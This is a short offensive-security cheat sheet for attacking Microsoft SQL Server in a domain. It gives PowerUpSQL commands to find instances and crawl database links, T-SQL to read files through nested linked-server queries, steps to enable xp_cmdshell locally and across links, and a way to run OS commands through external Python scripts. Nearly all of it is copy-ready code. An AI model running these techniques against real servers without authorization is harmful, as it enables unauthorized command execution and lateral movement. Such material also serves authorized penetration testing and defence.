# MSSQL Servers

### [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

Find Servers:

```text
Get-SQLInstanceDomain
```

Find Servers the current user can connect to as:

```text
PowerShell Get-SQLInstanceDomain | Get-SQLConnectionTest
```

Execute query or command:

```text
Get-SQLQuery -Instance '<server>.<domain>,1433' -Query 'select @@servername'
Invoke-SQLOSCmd -Instance '<server>.<domain>,1433' -Command 'dir C:\' -RawResults
```

Crawl Database Links:

```text
Get-SQLServerLinkCrawl -Instance '<server>.<domain>,1433'
```

Read file through linked servers:

```text
select * from openquery("<server>.<domain>", 'select * from openquery("<server>.<domain>", ''select * from openrowset(bulk N''''C:\x.txt'''', single_nclob) as contents'')')
```

### xp\_cmdshell

#### Enable locally

```text
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE
```

#### Enable through link \(requires RPC Out enabled\)

```text
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [<server>]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [<server>]
SELECT * FROM OPENQUERY("<server>", 'select * from sys.configurations where name = ''xp_cmdshell''')
```

#### Running xp\_cmdshell through serverlink

```text
SELECT * FROM OPENQUERY("<server>", 'select @@servername; exec xp_cmdshell ''dir c:''')
```

This will however not give any output \(but still execute\).

### External python script

```text
EXEC sp_configure 'external scripts enabled', 1
RECONFIGURE
EXEC sp_execute_external_script
@language =N'Python',
@script= N'import os; os.system("whoami")'
go
```

### SQLShell on Linux

```bash
docker pull mcr.microsoft.com/mssql-tools
docker run -it mcr.microsoft.com/mssql-tools
```

